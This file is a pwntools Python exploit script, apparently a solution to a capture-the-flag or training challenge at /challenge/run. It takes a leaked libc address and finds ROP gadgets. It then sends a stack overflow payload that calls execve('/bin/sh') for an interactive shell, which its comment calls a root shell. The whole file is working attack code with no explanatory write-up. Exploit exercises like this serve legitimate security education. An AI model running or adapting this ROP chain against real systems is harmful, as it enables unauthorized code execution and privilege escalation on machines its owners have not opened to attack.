#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/run
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/run')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# first, libc address is provided
io.recvuntil(b"at: ")
libc_addr = int(io.recvline().strip(), 16)
print("Libc is at:", libc_addr)

# now, load libc
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_rop = ROP(libc_elf)

## 1.1 find string - /bin/sh
bin_sh = next(libc_elf.search(b"/bin/sh")) # relative position
bin_sh += libc_addr # absolute address

## 1.2 pop rdi, ret
# libc_rop.rdi = 0x0
pop_rdi_gadget = libc_rop.find_gadget(['pop rdi', 'ret'])[0] # this address is relative to libc start
pop_rdi_gadget += libc_addr

## 2.1 zero can be loaded onto stack directly (? null byte?)

## 2.2 pop rdx, ret
# pop_rdx_gadget = libc_rop.find_gadget(['pop rdx', 'ret'])[0]
## exact gadget not found, just let pwn work its magic
## finds a gadget with an added pop r12, inconsequential
# libc_rop.rdx = 0x0
## so lets just assume we use this
pop_rdx_gadget = libc_rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
pop_rdx_gadget += libc_addr

## 3.1 zero can be loaded onto stack directly (? null byte?)

## 3.2 pop rsi, ret
# libc_rop.rsi = 0x0
pop_rsi_gadget = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rsi_gadget += libc_addr

## 4.1 0x3b can be loaded onto stack directly

## 4.2 pop rax, ret
# libc_rop.rax = 0x3b
pop_rax_gadget = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rax_gadget += libc_addr

## 5. syscall
syscall_gadget = libc_rop.find_gadget(['syscall'])[0]
syscall_gadget += libc_addr

# print(libc_rop.dump())

# payload padding
unbound_buffer = 0x7fffa6d1e910
saved_rip = 0x7fffa6d1e958
offset = saved_rip-unbound_buffer
payload_padding = b'F' * offset # pad until saved_rip

payload = payload_padding + \
    p64(pop_rdi_gadget) + p64(bin_sh) + \
    p64(pop_rdx_gadget) + p64(0) + p64(0) + \
    p64(pop_rsi_gadget) + p64(0) + \
    p64(pop_rax_gadget) + p64(0x3b) + \
    p64(syscall_gadget)

io.send(payload)

# root shell obtained
io.interactive()
